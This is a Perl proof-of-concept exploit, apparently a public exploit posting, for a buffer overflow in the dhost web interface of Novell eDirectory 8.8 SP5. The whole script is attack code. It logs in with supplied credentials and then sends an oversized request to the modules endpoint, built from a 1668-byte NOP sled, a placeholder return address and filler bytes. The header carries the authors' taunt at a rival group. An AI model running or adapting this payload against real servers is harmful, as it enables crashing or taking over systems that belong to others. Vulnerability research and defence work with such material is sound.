#PoC for Vulnerability:
#!usr\bin\perl
#Novell eDirectory 8.8 SP5 BoF Vuln - 0day
#Vulnerability found in Hellcode Labs.
#karak0rsan || murderkey
#info[at]hellcode.net || www.hellcode.net
#to GamaSEC: "please continue to discover and publish XSS BUGS.. you can just do that ;)"
#http://www.youtube.com/watch?v=6bloyjV-Hhs

use WWW::Mechanize; 

use LWP::Debug qw(+);

use HTTP::Cookies;

$target=$ARGV[0]; 


if(!$ARGV[0]){

        print "Novell eDirectory 8.8 SP5 Exploit\n";

        print "Hellcode Research || Hellcode.net\n";

        print "Usage:perl $0 [target]\n";
	
exit();
}



$login_url = "$target/_LOGIN_SERVER_";

$url = "$target/dhost/";

$vuln = "modules?L:";

$nop = "\x90" x 1668;

$eip = "\xef\xbe\xad\xde";

$data = "B" x 235;


$hellcode = $vuln.$nop.$eip.$data;

########Write your usr and pwd########

	  $username = "Admin.context";
 
 	  $password = "1234"; 

 
my $mechanize = WWW::Mechanize->new();


$mechanize->cookie_jar(HTTP::Cookies->new(file => "$cookie_file",autosave => 1));


$mechanize->timeout($url_timeout); 

$res = $mechanize->request(HTTP::Request->new('GET', "$login_url")); 


    $mechanize->submit_form( 

                  form_name => "authenticator", 

                  fields    => {        
            
                     usr => $username, 

                     pwd => $password}, 

                     button => 'Login'); 

$response2 = $mechanize->get("$url$hellcode");

